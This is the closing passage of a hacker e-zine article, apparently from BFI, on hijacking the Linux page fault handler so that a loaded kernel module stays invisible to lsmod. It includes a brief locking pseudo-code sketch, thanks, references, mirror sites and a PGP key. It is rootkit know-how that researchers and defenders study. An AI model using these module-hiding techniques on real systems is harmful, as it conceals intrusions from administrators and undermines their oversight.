+need a lot of luck to have it happened, but it can happen.
+
+Any trouble? A first analysis would lead to following answer "Of course". A
+serious analysis, though, would lead to this answer "Please, don't talk
+nonsense!"
+
+Nobody prevents me from this really bad behaviour while hijacking page fault
+handler.
+
+
+	lock_kernel();
+	[add module]
+	do_page_fault();
+	[remove module]
+	unlock_kernel();
+
+
+Do I have to explain it? OK, but this is last time for really. If I obtain a
+big giant lock I have no problems and I don't care at all which one of the two
+paths between the one listing modules and the one I adjusted in order to manage
+page fault obtains lock at first. Until two paths can't run at the same time, I
+can be sure lsmod will be blind... and nothing else matters!
+
+
+0x0c. Final considerations
+==========================
+
+A combination of what I introduced till now can be deadly to system. In this
+sense, I have many ideas running in my head, and, let's say it, I think we
+could do something more very interesting... or maybe it's already been done and
+it just lays in some hard disk awaiting world to get more responsible and some
+kinds of wicked code users to grow enough... but perhaps that's nothing but a
+dream!
+
+Now, move is to you... I moved the bishop!
+
+
+0x0d. Thanks
+============
+
+I'd like at first to thank Antifork Research staff. I wouldn't/shouldn't thank
+anybody in particular among them, but, in spite of politically correct, I will
+anyway! In fact, without twiz help I wouldn't have been able to write this new
+code.
+Thanks guy! The other person I have to thank is awgn, the guy that threw me
+into Antifork Research reality some time ago. That was a great chance that
+helped me to get mature... though nobody is ever! I also thank #phrack.it
+guys...
+
+
+0x0e. Referrings
+================
+
+ [1] "Understanding the Linux Kernel"
+     Daniel P. Bovet and Marco Cesati
+     O'Reilly
+
+ [2] "Linux Device Drivers"
+      Alessandro Rubini and Jonathan Corbet
+      O'Reilly
+
+ [3] Linux kernel source
+     [http://www.kernel.org]
+
+ [4] "Syscall Redirection Without Modifying the Syscall Table"
+     Silvio Cesare
+     [http://www.big.net.au/~silvio/]
+
+ [5] Kstat
+     [http://www.s0ftpj.org/en/tools.html]
+
+ [6] AngeL
+     [http://www.sikurezza.org/angel]
+
+ [7] "Handling Interrupt Descriptor Table for Fun and Profit"
+     kad
+     Phrack59-0x04
+     [http://www.phrack.org]
+
+
+
+-[ WEB ]----------------------------------------------------------------------
+
+        http://bfi.s0ftpj.org      [main site - IT]
+        http://bfi.cx              [mirror - IT]
+        http://bfi.freaknet.org    [mirror - AT]
+        http://bfi.anomalistic.org [mirror - SG]
+
+
+-[ E-MAiL ]-------------------------------------------------------------------
+
+        bfi@s0ftpj.org
+
+
+-[ PGP ]----------------------------------------------------------------------
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: 2.6.3i
+mQENAzZsSu8AAAEIAM5FrActPz32W1AbxJ/LDG7bB371rhB1aG7/AzDEkXH67nni
+DrMRyP+0u4tCTGizOGof0s/YDm2hH4jh+aGO9djJBzIEU8p1dvY677uw6oVCM374
+nkjbyDjvBeuJVooKo+J6yGZuUq7jVgBKsR0uklfe5/0TUXsVva9b1pBfxqynK5OO
+lQGJuq7g79jTSTqsa0mbFFxAlFq5GZmL+fnZdjWGI0c2pZrz+Tdj2+Ic3dl9dWax
+iuy9Bp4Bq+H0mpCmnvwTMVdS2c+99s9unfnbzGvO6KqiwZzIWU9pQeK+v7W6vPa3
+TbGHwwH4iaAWQH0mm7v+KdpMzqUPucgvfugfx+kABRO0FUJmSTk4IDxiZmk5OEB1
+c2EubmV0PokBFQMFEDZsSu+5yC9+6B/H6QEBb6EIAMRP40T7m4Y1arNkj5enWC/b
+a6M4oog42xr9UHOd8X2cOBBNB8qTe+dhBIhPX0fDJnnCr0WuEQ+eiw0YHJKyk5ql
+GB/UkRH/hR4IpA0alUUjEYjTqL5HZmW9phMA9xiTAqoNhmXaIh7MVaYmcxhXwoOo
+WYOaYoklxxA5qZxOwIXRxlmaN48SKsQuPrSrHwTdKxd+qB7QDU83h8nQ7dB4MAse
+gDvMUdspekxAX8XBikXLvVuT0ai4xd8o8owWNR5fQAsNkbrdjOUWrOs0dbFx2K9J
+l3XqeKl3XEgLvVG8JyhloKl65h9rUyw6Ek5hvb5ROuyS/lAGGWvxv2YJrN8ABLo=
+=o7CG
+-----END PGP PUBLIC KEY BLOCK-----
+
+
+==============================================================================
+-----------------------------------[ EOF ]------------------------------------
+==============================================================================
+
